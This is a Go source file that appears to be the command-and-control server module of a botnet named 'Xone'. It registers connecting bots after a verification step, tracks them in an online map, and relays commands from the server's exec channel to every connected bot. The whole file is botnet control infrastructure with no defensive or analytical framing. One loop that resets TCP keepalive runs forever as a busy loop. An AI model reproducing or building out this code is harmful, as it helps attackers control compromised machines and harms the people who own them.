package cnc

import (
	"Xone/utils"
	"fmt"
	"net"
	"time"
)

func NewBot(conn net.Conn, addr string, server *CNC) *BotInfo {

	bot := &BotInfo{
		Conn:               conn,
		IpAddr:             addr,
		ConnStats:          false,
		ExitChan:           make(chan bool),
		OlineBot:           make(chan string),
		OfflineBot:         make(chan string),
		BotsVerify:         utils.GlobalObject.ClientVerify,
		BotsVerifyCallback: utils.GlobalObject.ServerVerifyCallBack,
		server:             server,
	}
	return bot
}

func (b *BotInfo) HandBotsConnection() {
	defer b.Stop()
	if b.BotVerify() != true {
		return
	}

	if _, k := b.server.OnlineMap[b.IpAddr]; k {
		CmdMessage(b.Conn, "xcxcxcx")
		b.OfflineBot <- b.IpAddr
	}
	b.OlineBot <- b.IpAddr

	for {
		if tcpConn, ok := b.Conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(time.Second * 10)
		}
	}
}

func (b *BotInfo) startConnection() {
	go b.HandBotsConnection()
	for {
		select {
		case <-b.ExitChan:
			b.Conn.Close()
			return
		case addr := <-b.OlineBot:
			b.server.MapLock.Lock()
			b.server.OnlineMap[addr] = b
			b.server.MapLock.Unlock()
			fmt.Println("[+]Online", addr)
		case addr := <-b.OfflineBot:
			b.server.MapLock.Lock()
			delete(b.server.OnlineMap, addr)
			b.server.MapLock.Unlock()
			fmt.Println("[-]Offline", addr)
		case x1 := <-b.server.exec:
			go CmdMessage(b.Conn, x1)
		}
	}
}

func (b *BotInfo) Stop() {
	if b.ConnStats == true {
		return
	}
	b.ConnStats = true
	b.Conn.Close()
	close(b.ExitChan)
	close(b.OlineBot)
	close(b.OfflineBot)
}
